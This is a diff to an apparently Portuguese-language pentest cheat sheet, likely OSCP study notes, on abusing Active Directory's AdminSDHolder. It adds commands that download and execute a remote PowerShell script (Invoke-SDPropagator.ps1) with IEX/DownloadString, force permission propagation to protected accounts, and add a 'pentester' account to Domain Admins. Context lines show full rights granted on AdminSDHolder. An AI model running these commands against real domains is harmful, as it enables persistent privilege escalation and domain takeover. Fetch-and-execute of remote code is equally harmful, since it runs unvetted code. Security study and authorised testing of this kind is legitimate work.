@@ -1625,12 +1625,15 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cia
 ```
 Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' -PrincipalIdentity pentester -Rights All -Verbose
 ```
-
-
-
-
-
-
+##### ADMIN SDHOLDER - PROPAGAR AS PERMISSÕES PARA AS CONTAS PROTEGIDAS
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-SDPropagator.ps1")
+Invoke-SDPropagator -timeoutminutes 1 -ShowProgress -Verbose
+```
+##### ADMIN SDHOLDER - ABUSSAR DE PERMISSÃO PARA ADICIONAR USUARIO NO GRUPO DE ADMINISTRADORES
+```
+Add-ADGroupMember -Identity 'Domain Admins' -Members pentester
+```
 
 
 
